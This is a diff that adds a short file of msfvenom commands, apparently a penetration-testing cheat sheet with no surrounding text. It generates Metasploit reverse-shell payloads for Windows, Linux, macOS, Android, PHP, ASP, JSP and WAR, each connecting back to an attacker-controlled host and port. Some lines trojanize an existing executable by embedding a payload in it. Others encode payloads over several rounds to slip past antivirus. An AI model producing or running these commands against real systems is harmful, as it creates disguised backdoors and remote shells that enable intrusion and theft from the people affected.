@@ -1,0 +1,13 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe > example.exe
+msfvenom -p windows/meterpreter/reverse_http LHOST={IP} LPORT={PORT} -f exe > example.exe
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f elf > example.elf
+msfvenom -p osx/x86/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f macho > example.macho
+msfvenom -p android/meterpreter/reverse/tcp LHOST={IP} LPORT={PORT} R > example.apk
+msfvenom -p php/meterpreter_reverse_tcp LHOST={IP} LPORT={PORT} -f raw > example.php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f asp > example.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP} LPORT={PORT} -f raw > example.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP} LPORT={PORT} -f war > example.war
+msfvenom -l encoders
+msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe > example.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > example.exe
+msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe
